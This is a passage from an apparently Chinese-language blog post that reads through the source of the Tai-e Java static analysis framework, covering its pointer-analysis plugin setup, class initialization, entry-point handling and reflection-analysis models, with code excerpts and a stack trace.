class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setPlugin</span><span class="params">(Solver solver, AnalysisOptions options)</span> &#123;</span><br><span class="line">    <span class="type">CompositePlugin</span> <span class="variable">plugin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CompositePlugin</span>();</span><br><span class="line">    <span class="comment">// add builtin plugins</span></span><br><span class="line">    <span class="comment">// To record elapsed time precisely, AnalysisTimer should be added at first.</span></span><br><span class="line">    plugin.addPlugin(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">AnalysisTimer</span>(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">EntryPointHandler</span>(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClassInitializer</span>(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ThreadHandler</span>(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">NativeModeller</span>(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ExceptionAnalysis</span>()</span><br><span class="line">    );</span><br><span class="line">    <span class="type">int</span> <span class="variable">javaVersion</span> <span class="operator">=</span> World.get().getOptions().getJavaVersion();</span><br><span class="line">    <span class="comment">// ReferenceHandler 不支持java9 以上</span></span><br><span class="line">    <span class="keyword">if</span> (javaVersion &lt; <span class="number">9</span>) &#123;</span><br><span class="line">        <span class="comment">// current reference handler doesn&#x27;t support Java 9+</span></span><br><span class="line">        plugin.addPlugin(<span class="keyword">new</span> <span class="title class_">ReferenceHandler</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理lambda</span></span><br><span class="line">    <span class="keyword">if</span> (javaVersion &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">        plugin.addPlugin(<span class="keyword">new</span> <span class="title class_">LambdaAnalysis</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理java8 string</span></span><br><span class="line">    <span class="keyword">if</span> (javaVersion &gt;= <span class="number">9</span>) &#123;</span><br><span class="line">        plugin.addPlugin(<span class="keyword">new</span> <span class="title class_">Java9StringConcatHandler</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理反射</span></span><br><span class="line">    <span class="keyword">if</span> (options.getString(<span class="string">&quot;reflection-inference&quot;</span>) != <span class="literal">null</span> ||</span><br><span class="line">            options.getString(<span class="string">&quot;reflection-log&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        plugin.addPlugin(<span class="keyword">new</span> <span class="title class_">ReflectionAnalysis</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理动态invoke</span></span><br><span class="line">    <span class="keyword">if</span> (options.getBoolean(<span class="string">&quot;handle-invokedynamic&quot;</span>) &amp;&amp;</span><br><span class="line">            InvokeDynamicAnalysis.useMethodHandle()) &#123;</span><br><span class="line">        plugin.addPlugin(<span class="keyword">new</span> <span class="title class_">InvokeDynamicAnalysis</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果有配置taint-config，那么也加载污点插件</span></span><br><span class="line">    <span class="keyword">if</span> (options.getString(<span class="string">&quot;taint-config&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        plugin.addPlugin(<span class="keyword">new</span> <span class="title class_">TaintAnalysis</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    plugin.addPlugin(<span class="keyword">new</span> <span class="title class_">ResultProcessor</span>());</span><br><span class="line">    <span class="comment">// add plugins specified in options</span></span><br><span class="line">    <span class="comment">// noinspection unchecked</span></span><br><span class="line">    <span class="comment">// 增加自定义的插件</span></span><br><span class="line">    addPlugins(plugin, (List&lt;String&gt;) options.get(<span class="string">&quot;plugins&quot;</span>));</span><br><span class="line">    <span class="comment">// connects plugins and solver</span></span><br><span class="line">    plugin.setSolver(solver);</span><br><span class="line">    solver.setPlugin(plugin);</span><br></pre></td></tr></table></figure><h2 id="3-2-Plugins"><a href="#3-2-Plugins" class="headerlink" title="3.2 Plugins"></a>3.2 Plugins</h2><p>在PTA分析中，默认会加载这些插件：</p><ul><li>AnalysisTimer: 用于计算分析时间</li><li>EntryPointHandler：入口函数处理，目前为Main函数和隐式函数，比如Thread#run</li><li>ClassInitializer：类关系及静态变量/代码块的处理</li><li>ThreadHandler：</li><li>NativeModeller</li><li>ExceptionAnalysis</li><li>LambdaAnalysis</li><li>Java9StringConcatHandler</li><li>ReflectionAnalysis</li><li>TaintAnalysis</li><li>ResultProcessor</li></ul><p>有些可能跟反射分析关系不大，跟踪下一些不是一眼就能看出干什么的plugin</p><h3 id="3-2-1-CompositePlugin"><a href="#3-2-1-CompositePlugin" class="headerlink" title="3.2.1 CompositePlugin"></a>3.2.1 CompositePlugin</h3><p>CompositePlugin 可以看成是plugin的集合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 所有的插件</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> List&lt;Plugin&gt; allPlugins = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">   <span class="comment">// Use separate lists to store plugins that overwrite</span></span><br><span class="line">   <span class="comment">// frequently-invoked methods.</span></span><br><span class="line"><span class="comment">// 存在NewPointsToSet的插件，新增一个var指向obj</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Plugin&gt; onNewPointsToSetPlugins = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">// 存在NewCallEdge的插件，新增一个calledge pfg边</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> List&lt;Plugin&gt; onNewCallEdgePlugins = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">// 存在NewMethod的插件，新增一个处理new method</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Plugin&gt; onNewMethodPlugins = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">// 存在NewStmt的插件，新增一个处理new stmt</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Plugin&gt; onNewStmtPlugins = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">// 存在NewCSMethod的插件，新增一个处理new CSMethod</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Plugin&gt; onNewCSMethodPlugins = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">// 存在UnresolvedCall的插件，新增一个UnresolvedCall</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Plugin&gt; onUnresolvedCallPlugins = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br></pre></td></tr></table></figure><h3 id="3-2-2-ClassInitializer"><a href="#3-2-2-ClassInitializer" class="headerlink" title="3.2.2 ClassInitializer"></a>3.2.2 ClassInitializer</h3><p>ClassInitializer 顾名思义是用于处理class 相关</p><h4 id="onNewMethod"><a href="#onNewMethod" class="headerlink" title="onNewMethod"></a>onNewMethod</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNewMethod</span><span class="params">(JMethod method)</span> &#123;</span><br><span class="line"><span class="comment">// 当遇到静态方法或者构造方法，通过solver初始化该method对应的class</span></span><br><span class="line">    <span class="keyword">if</span> (method.isStatic() || method.isConstructor()) &#123;</span><br><span class="line">        solver.initializeClass(method.getDeclaringClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="onNewStmt"><a href="#onNewStmt" class="headerlink" title="onNewStmt"></a>onNewStmt</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNewStmt</span><span class="params">(Stmt stmt, JMethod container)</span> &#123;</span><br><span class="line"><span class="comment">// 处理新的stmt语句，如果stmt是常量赋值</span></span><br><span class="line">    <span class="keyword">if</span> (stmt <span class="keyword">instanceof</span> AssignLiteral) &#123;</span><br><span class="line">     <span class="comment">// 获取常量类型</span></span><br><span class="line">        <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> ((AssignLiteral) stmt).getRValue().getType();</span><br><span class="line">        <span class="comment">// 如果是ClassType</span></span><br><span class="line">        <span class="keyword">if</span> (type <span class="keyword">instanceof</span> ClassType) &#123;</span><br><span class="line">        <span class="comment">// 通过solver初始化该class</span></span><br><span class="line">            solver.initializeClass(((ClassType) type).getJClass());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stmt <span class="keyword">instanceof</span> FieldStmt&lt;?, ?&gt; fieldStmt) &#123;</span><br><span class="line">    <span class="comment">// 如果是静态属性语句，同样的，通过solver初始化该field的class</span></span><br><span class="line">        <span class="keyword">if</span> (fieldStmt.isStatic()) &#123;</span><br><span class="line">            <span class="type">JField</span> <span class="variable">field</span> <span class="operator">=</span> fieldStmt.getFieldRef().resolve();</span><br><span class="line">            solver.initializeClass(field.getDeclaringClass());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="DefaultSolver-initializeClass"><a href="#DefaultSolver-initializeClass" class="headerlink" title="DefaultSolver#initializeClass"></a>DefaultSolver#initializeClass</h4><p>看看initializeClass 具体做了什么</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initializeClass</span><span class="params">(JClass cls)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cls == <span class="literal">null</span> || initializedClasses.contains(cls)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// initialize super class</span></span><br><span class="line">    <span class="comment">// 递归处理其父类</span></span><br><span class="line">    <span class="type">JClass</span> <span class="variable">superclass</span> <span class="operator">=</span> cls.getSuperClass();</span><br><span class="line">    <span class="keyword">if</span> (superclass != <span class="literal">null</span>) &#123;</span><br><span class="line">        initializeClass(superclass);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> initialize the superinterfaces which</span></span><br><span class="line">    <span class="comment">//  declare default methods</span></span><br><span class="line">    <span class="comment">// 注意这里clinit和 init的区别，这里是处理静态变量</span></span><br><span class="line">    <span class="type">JMethod</span> <span class="variable">clinit</span> <span class="operator">=</span> cls.getClinit();</span><br><span class="line">    <span class="keyword">if</span> (clinit != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// addCSMethod() may trigger initialization of more</span></span><br><span class="line">        <span class="comment">// classes. So cls must be added before addCSMethod(),</span></span><br><span class="line">        <span class="comment">// otherwise, infinite recursion may occur.</span></span><br><span class="line">        initializedClasses.add(cls);</span><br><span class="line">        <span class="comment">// 处理clinit方法</span></span><br><span class="line">        <span class="comment">// 还有注意这里的csManager.getCSMethod，不存在则新增</span></span><br><span class="line">        <span class="type">CSMethod</span> <span class="variable">csMethod</span> <span class="operator">=</span> csManager.getCSMethod(</span><br><span class="line">                contextSelector.getEmptyContext(), clinit);</span><br><span class="line">        addCSMethod(csMethod);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Java 类加载的初始化过程中，编译器按语句在源文件中出现的顺序，依次自动收集类中的所有类变量的赋值动作和静态代码块中的语句合并产生<code>&lt;clinit\&gt;()</code> 方法。 如果类中没有静态语句和静态代码块，那可以不生成<code>&lt;clinit&gt;()</code> 方法。</p></blockquote><p>总结下：</p><ol><li>DefaultSolver#initializedClasses 属性作用：记录所有的class</li><li>initializeClass 方法的作用：<ul><li>处理当前类及父类，保存在DefaultSolver#initializedClasses 中，已经在该变量中的不再进行处理</li><li>如果该类/父类有clinit方法（有静态变量/代码块），那么处理该clinit，加入分析逻辑（addCSMethod）</li><li>同时也讲clinit存入结果集中：csManager.mtdManager </li></ul></li></ol><h4 id="JClass-IR"><a href="#JClass-IR" class="headerlink" title="JClass IR"></a>JClass IR</h4><h3 id="3-2-3-EntryPointHandler"><a href="#3-2-3-EntryPointHandler" class="headerlink" title="3.2.3 EntryPointHandler"></a>3.2.3 EntryPointHandler</h3><p>EntryPointHandler 也是个plugin，而且顺序放在第二</p><p>其作用是从入口函数开始分析</p><p><img src="/images/pasted-709.png" alt="upload successful"></p><p>DefaultSolver#addEntryPoint</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processNewMethod</span><span class="params">(JMethod method)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (reachableMethods.add(method)) &#123;</span><br><span class="line">        plugin.onNewMethod(method);</span><br><span class="line">        method.getIR().forEach(stmt -&gt; plugin.onNewStmt(stmt, method));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>reachableMethods 可达method 增加该method</li><li>每个plugin执行onNewMethod</li><li>针对该method 的每个子stmt，调用所有plugin 的onNewStmt</li></ol><p>ClassInitializer#onNewStmt</p><p>从此之后进进入类似JavaComipler Visitor的逻辑<br>DefaultSolver$StmtProcessor$Visitor </p><h4 id="EntryPointHandler-onStart"><a href="#EntryPointHandler-onStart" class="headerlink" title="EntryPointHandler#onStart"></a>EntryPointHandler#onStart</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public void onStart() &#123;</span><br><span class="line">    // process program main method</span><br><span class="line">    JMethod mainMethod = World.get().getMainMethod();</span><br><span class="line">    if (mainMethod != null) &#123;</span><br><span class="line">        solver.addEntryPoint(new EntryPoint(mainMethod,</span><br><span class="line">                new MainEntryPointParamProvider(mainMethod, solver)));</span><br><span class="line">    &#125;</span><br><span class="line">    // process implicit entries</span><br><span class="line">    if (solver.getOptions().getBoolean(&quot;implicit-entries&quot;)) &#123;</span><br><span class="line">        for (JMethod entry : World.get().getImplicitEntries()) &#123;</span><br><span class="line">            solver.addEntryPoint(new EntryPoint(entry, EmptyParamProvider.get()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>手动置顶的MainClass</li><li>如果设置implicit-entries项为true，那么隐式入口也会被当作入口</li></ul><p>solver#addEntryPoint 以这几个main函数为入口，进行CFG构建</p><blockquote><p>通过method.getIR() 获取所包含的IR，然后进行遍历</p></blockquote><p><img src="/images/pasted-719.png" alt="upload successful"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">addCallEdge:808, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">processInvokeStatic:649, DefaultSolver$StmtProcessor$Visitor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">visit:723, DefaultSolver$StmtProcessor$Visitor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">visit:570, DefaultSolver$StmtProcessor$Visitor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">accept:152, Invoke (pascal.taie.ir.stmt)</span><br><span class="line">lambda$process$0:564, DefaultSolver$StmtProcessor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">accept:-1, DefaultSolver$StmtProcessor$$Lambda$324/0x0000000800f02a20 (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">forEach:75, Iterable (java.lang)</span><br><span class="line">process:564, DefaultSolver$StmtProcessor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addStmts:827, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addCSMethod:820, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">initializeClass:855, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">onNewStmt:62, ClassInitializer (pascal.taie.analysis.pta.plugin)</span><br><span class="line">lambda$onNewStmt$4:124, CompositePlugin (pascal.taie.analysis.pta.plugin)</span><br><span class="line">accept:-1, CompositePlugin$$Lambda$323/0x0000000800f01510 (pascal.taie.analysis.pta.plugin)</span><br><span class="line">forEach:1511, ArrayList (java.util)</span><br><span class="line">onNewStmt:124, CompositePlugin (pascal.taie.analysis.pta.plugin)</span><br><span class="line">lambda$processNewMethod$10:538, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">accept:-1, DefaultSolver$$Lambda$322/0x0000000800f012d8 (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">forEach:75, Iterable (java.lang)</span><br><span class="line">processNewMethod:538, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addCSMethod:819, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addEntryPoint:787, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">onStart:59, EntryPointHandler (pascal.taie.analysis.pta.plugin)</span><br><span class="line">accept:-1, CompositePlugin$$Lambda$311/0x0000000800efb4a8 (pascal.taie.analysis.pta.plugin)</span><br><span class="line">forEach:1511, ArrayList (java.util)</span><br><span class="line">onStart:99, CompositePlugin (pascal.taie.analysis.pta.plugin)</span><br><span class="line">initialize:265, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br></pre></td></tr></table></figure><h3 id="3-2-4-LambdaAnalysis"><a href="#3-2-4-LambdaAnalysis" class="headerlink" title="3.2.4 LambdaAnalysis"></a>3.2.4 LambdaAnalysis</h3><h3 id="3-2-5-ThreadHandler"><a href="#3-2-5-ThreadHandler" class="headerlink" title="3.2.5 ThreadHandler"></a>3.2.5 ThreadHandler</h3><p>待分析</p><h1 id="0x4-反射分析"><a href="#0x4-反射分析" class="headerlink" title="0x4 反射分析"></a>0x4 反射分析</h1><p>反射分析有两个目录</p><ul><li>reflection</li><li>invokedymanic</li></ul><h2 id="4-1-ReflectionAnalysis"><a href="#4-1-ReflectionAnalysis" class="headerlink" title="4.1 ReflectionAnalysis"></a>4.1 ReflectionAnalysis</h2><p>ReflectionAnalysis 是用于处理Java反射的插件Plugin，分析具体的逻辑。</p><h3 id="4-1-1-field"><a href="#4-1-1-field" class="headerlink" title="4.1.1 field"></a>4.1.1 field</h3><p>有几个特殊的field单独讲解下。</p><ul><li>csManager: 上下文管理</li></ul><p>Model: </p><ul><li>logBasedModel：用于统计反射分析结果记录日志</li><li>inferenceModel：推断反射调用，可能有以下取值<ul><li>StringBasedModel：通过String判断</li><li>SolarModel：Solar算法</li><li>DummyModel：do nothing</li></ul></li><li>reflectiveActionModel：和inferenceModel类似，老版本？</li><li>annotationModel：处理注解</li><li>othersModel：</li></ul><h3 id="4-1-2-setSolver"><a href="#4-1-2-setSolver" class="headerlink" title="4.1.2 setSolver"></a>4.1.2 setSolver</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSolver</span><span class="params">(Solver solver)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.solver = solver;</span><br><span class="line">        csManager = solver.getCSManager();</span><br><span class="line"></span><br><span class="line">        <span class="type">MetaObjHelper</span> <span class="variable">helper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MetaObjHelper</span>(solver);</span><br><span class="line">        <span class="type">TypeMatcher</span> <span class="variable">typeMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeMatcher</span>(solver.getTypeSystem());</span><br><span class="line">        <span class="type">String</span> <span class="variable">logPath</span> <span class="operator">=</span> solver.getOptions().getString(<span class="string">&quot;reflection-log&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (logPath != <span class="literal">null</span>) &#123;</span><br><span class="line">            logBasedModel = <span class="keyword">new</span> <span class="title class_">LogBasedModel</span>(solver, helper, logPath);</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;Invoke&gt; invokesWithLog = logBasedModel != <span class="literal">null</span></span><br><span class="line">                ? logBasedModel.getInvokesWithLog() : Set.of();</span><br><span class="line">        <span class="type">String</span> <span class="variable">reflection</span> <span class="operator">=</span> solver.getOptions().getString(<span class="string">&quot;reflection-inference&quot;</span>);</span><br><span class="line">        <span class="comment">// 常量string模型</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;string-constant&quot;</span>.equals(reflection)) &#123;</span><br><span class="line">            inferenceModel = <span class="keyword">new</span> <span class="title class_">StringBasedModel</span>(solver, helper, invokesWithLog);</span><br><span class="line">        <span class="comment">// solar模型</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;solar&quot;</span>.equals(reflection)) &#123;</span><br><span class="line">            inferenceModel = <span class="keyword">new</span> <span class="title class_">SolarModel</span>(solver, helper, typeMatcher, invokesWithLog);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (reflection == <span class="literal">null</span>) &#123;</span><br><span class="line">            inferenceModel = <span class="keyword">new</span> <span class="title class_">DummyModel</span>(solver);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal reflection option: &quot;</span> + reflection);</span><br><span class="line">        &#125;</span><br><span class="line">        reflectiveActionModel = <span class="keyword">new</span> <span class="title class_">ReflectiveActionModel</span>(solver, helper,</span><br><span class="line">                typeMatcher, invokesWithLog);</span><br><span class="line">        annotationModel = <span class="keyword">new</span> <span class="title class_">AnnotationModel</span>(solver, helper);</span><br><span class="line">        othersModel = <span class="keyword">new</span> <span class="title class_">OthersModel</span>(solver, helper);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="4-1-3-on-API"><a href="#4-1-3-on-API" class="headerlink" title="4.1.3 on API"></a>4.1.3 on API</h3><p>大致就是调用对应的Model API，顺序一般是</p><ul><li>inferenceModel: SolarModel</li><li>reflectiveActionModel</li><li>othersModel</li></ul><h4 id="onNewStmt-1"><a href="#onNewStmt-1" class="headerlink" title="onNewStmt"></a>onNewStmt</h4><p>当遇到新的Stmt，调用以上的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNewStmt</span><span class="params">(Stmt stmt, JMethod container)</span> &#123;</span><br><span class="line"><span class="comment">// 如果是invoke，那么调用以上的各个model进行处理</span></span><br><span class="line">    <span class="keyword">if</span> (stmt <span class="keyword">instanceof</span> Invoke invoke) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!invoke.isDynamic()) &#123;</span><br><span class="line">            inferenceModel.handleNewInvoke(invoke);</span><br><span class="line">            reflectiveActionModel.handleNewInvoke(invoke);</span><br><span class="line">            othersModel.handleNewInvoke(invoke);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 如果不是invoke，继续尝试inferenceModel调用非invoke接口</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        inferenceModel.handleNewNonInvokeStmt(stmt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="onNewPointsToSet"><a href="#onNewPointsToSet" class="headerlink" title="onNewPointsToSet"></a>onNewPointsToSet</h4><p>当新Var指向新PTS，调用Model的handleNewPointsToSet接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNewPointsToSet</span><span class="params">(CSVar csVar, PointsToSet pts)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (inferenceModel.isRelevantVar(csVar.getVar())) &#123;</span><br><span class="line">        inferenceModel.handleNewPointsToSet(csVar, pts);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (reflectiveActionModel.isRelevantVar(csVar.getVar())) &#123;</span><br><span class="line">        reflectiveActionModel.handleNewPointsToSet(csVar, pts);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (othersModel.isRelevantVar(csVar.getVar())) &#123;</span><br><span class="line">        othersModel.handleNewPointsToSet(csVar, pts);</span><br><span class="line">    &#125;</span><br><span class="line">    reflectiveArgs.get(csVar.getVar())</span><br><span class="line">            .forEach(edge -&gt; passReflectiveArgs(edge, pts));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="onNewCSMethod"><a href="#onNewCSMethod" class="headerlink" title="onNewCSMethod"></a>onNewCSMethod</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNewCSMethod</span><span class="params">(CSMethod csMethod)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (logBasedModel != <span class="literal">null</span>) &#123;</span><br><span class="line">        logBasedModel.handleNewCSMethod(csMethod);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="onUnresolvedCall"><a href="#onUnresolvedCall" class="headerlink" title="onUnresolvedCall"></a>onUnresolvedCall</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 